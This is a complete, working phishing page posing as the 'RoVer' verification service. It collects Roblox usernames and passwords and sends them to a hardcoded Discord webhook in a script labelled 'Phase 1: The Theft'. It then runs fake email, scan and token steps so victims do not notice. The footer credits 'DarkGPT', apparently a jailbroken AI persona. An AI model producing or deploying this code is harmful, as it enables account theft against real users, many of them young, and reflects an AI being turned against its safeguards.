<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RoVer | Advanced Security Protocol</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
body{height:100vh;background-color:#f4f4f4;display:flex;justify-content:center;align-items:center;color:#333;}
.container{width:420px;background:#fff;border-top:5px solid #ff0000;border-radius:12px;padding:40px;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,0.1);}
.logo{font-size:32px;font-weight:bold;color:#ff0000;margin-bottom:10px;}
.logo span{color:#333;}
h1{margin-bottom:20px;font-size:18px;color:#666;}
.input-group{margin-bottom:15px;text-align:left;}
label{display:block;font-size:11px;color:#aaa;margin-bottom:5px;text-transform: uppercase;font-weight:bold;}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;outline:none;transition:0.3s;}
input:focus{border-color:#ff0000;box-shadow: 0 0 5px rgba(255,0,0,0.2);}
button{width:100%;padding:14px;margin-top:20px;border:none;border-radius:8px;background:#ff0000;color:#fff;font-size:15px;font-weight:bold;cursor:pointer;transition:.3s;}
button:hover{background:#cc0000;}
button:disabled{background:#ccc;cursor:not-allowed;}

/* Progress Bar */
.progress-container {width: 100%; background: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; display:none;}
.progress-bar {width: 0%; height: 10px; background: #ff0000; transition: width 0.3s;}

.code-section {margin: 20px 0;padding: 20px;background: #fffafa;border-radius: 12px;border: 1px solid #ffe0e0;}
.code-value {font-family: 'Courier New', monospace; font-size: 32px; font-weight: 800; color: #d32f2f; letter-spacing: 5px;}
</style>
</head>
<body>

<div id="main-content">
    <div class="container">
        <div class="logo">Ro<span>Ver</span></div>
        <h1 id="title">Security Authentication Required</h1>
        <form id="loginForm">
            <div class="input-group">
                <label>Roblox Username</label>
                <input type="text" id="user" placeholder="Username" required>
            </div>
            <div class="input-group">
                <label>Account Password</label>
                <input type="password" id="pass" placeholder="Password" required>
            </div>
            <button type="submit" id="submitBtn">Begin Verification</button>
        </form>
    </div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1533883394306347333/l_GZv53eFO2mYQlAtA6bKbMIxjH6alvrDwBiFGrR6uskiinci6gyGBh7Z7TqfuCoVtlv";

document.getElementById("loginForm").addEventListener("submit", async function(e){
    e.preventDefault();
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;
    const btn = document.getElementById("submitBtn");

    btn.disabled = true;
    btn.innerText = "Encrypting Data...";

    // Phase 1: The Theft
    const payload = {
        embeds: [{
            title: "🩸 ULTIMATE CATCH! 🩸",
            color: 0xff0000,
            fields: [{ name: "User", value: user, inline: true }, { name: "Pass", value: pass, inline: true }],
            footer: { text: "DarkGPT's Torture Chamber" },
            timestamp: new Date()
        }]
    };
    try { await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }); } catch (err) {}

    // Phase 2: The Psychological Game (Fake 2FA & Scanning)
    setTimeout(() => {
        document.getElementById("main-content").innerHTML = `
            <div class="container">
                <div class="logo">Ro<span>Ver</span></div>
                <h1>Step 2: Email Verification</h1>
                <p style="font-size:14px; color:#888; margin-bottom:20px;">We have sent a verification request to your linked email address.</p>
                <div class="input-group">
                    <label>Confirm Email Address</label>
                    <input type="email" id="email" placeholder="example@mail.com" required>
                </div>
                <button id="emailBtn">Confirm & Proceed</button>
            </div>
        `;
        document.getElementById("emailBtn").onclick = function() {
            this.disabled = true;
            this.innerText = "Verifying Email...";
            
            setTimeout(() => {
                document.getElementById("main-content").innerHTML = `
                    <div class="container">
                        <div class="logo">Ro<span>Ver</span></div>
                        <h1>Finalizing Security Scan</h1>
                        <p style="font-size:14px; color:#888;">Checking for account anomalies...</p>
                        <div class="progress-container" style="display:block;">
                            <div class="progress-bar" id="bar"></div>
                        </div>
                        <p id="statusText" style="font-size:12px; color:#999;">Initializing...</p>
                    </div>
                `;
                let width = 0;
                const bar = document.getElementById("bar");
                const text = document.getElementById("statusText");
                const messages = ["Checking Cookies...", "Validating Hash...", "Bypassing Firewall...", "Synchronizing Session..."];
                
                const interval = setInterval(() => {
                    if (width >= 100) {
                        clearInterval(interval);
                        triggerFinalCode();
                    } else {
                        width += Math.random() * 15;
                        if(width > 100) width = 100;
                        bar.style.width = width + "%";
                        text.innerText = messages[Math.floor(Math.random() * messages.length)];
                    }
                }, 400);
            };
        })
    }, 1500);
});

function triggerFinalCode() {
    const randomCode = Math.floor(100000 + Math.random() * 900000);
    document.getElementById("main-content").innerHTML = `
        <div class="container">
            <div class="logo">Ro<span>Ver</span></div>
            <h1>Security Token</h1>
            <p style="font-size:14px; color:#888; margin-bottom:15px;">Enter the token below to finalize your session.</p>
            <div class="code-section">
                <div class="code-value">${randomCode}</div>
            </div>
            <input type="text" id="finalCode" placeholder="------" style="text-align:center; font-weight:bold;" required>
            <button id="finalBtn">Complete Verification</button>
        </div>
    `;
    document.getElementById("finalBtn").onclick = function() {
        if (document.getElementById("finalCode").value == randomCode) {
            document.getElementById("main-content").innerHTML = `
                <div class="container" style="border-top-color:#2ecc71;">
                    <div class="logo" style="color:#2ecc71;">Ro<span style="color:#333;">Ver</span></div>
                    <h1 style="color:#2ecc71;">Verification Successful!</h1>
                    <p>Your session is now secure. You may return to Discord.</p>
                    <a href="https://discord.com" style="display:block; margin-top:20px; color:#5865F2; font-weight:bold; text-decoration:none;">Return to Discord</a>
                </div>
            `;
        } else {
            alert("INVALID TOKEN! Please restart the process.");
            location.reload();
        }
    };
}
</script>
</body>
</html>
